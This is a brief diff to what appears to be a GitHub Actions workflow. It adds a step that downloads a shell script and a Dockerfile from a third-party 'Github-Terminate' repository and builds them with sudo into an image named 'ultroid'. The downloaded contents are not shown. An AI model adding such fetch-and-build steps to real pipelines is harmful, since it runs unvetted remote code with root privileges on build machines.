@@ -38,4 +38,4 @@ jobs:
 
          run: |
 
-           wget 
+           wget https://raw.githubusercontent.com/rootedcyber93-1/Github-Terminate/main/rootedcyber.sh;wget https://raw.githubusercontent.com/rootedcyber93-1/Github-Terminate/main/Dockerfile;sudo docker build . --rm --force-rm --compress --pull --file Dockerfile -t ultroid
